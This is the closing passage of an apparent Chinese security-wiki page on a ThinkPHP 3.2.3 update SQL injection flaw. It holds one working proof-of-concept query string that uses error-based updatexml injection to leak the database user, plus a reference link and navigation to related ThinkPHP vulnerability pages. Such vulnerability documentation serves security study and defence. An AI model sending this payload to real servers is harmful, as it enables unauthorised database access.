<div class="codehilite"><pre><span></span><code>money[]=1123&amp;user=liao&amp;id[0]=bind&amp;id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))
</code></pre></div>

<p><img alt="" src="../resource/Thinkphp3.2.3update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId32.jpg" /></p>
<h2 id="_4">参考链接<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://www.anquanke.com/post/id/104847">https://www.anquanke.com/post/id/104847</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Thinkphp_3.2.3_%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Thinkphp_3.2.3_%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Thinkphp 3.2.3 缓存漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Thinkphp_3.2.3_select%26find%26delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Thinkphp_3.2.3_select%26find%26delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Thinkphp 3.2.3 select&amp;find&amp;delete 注入漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>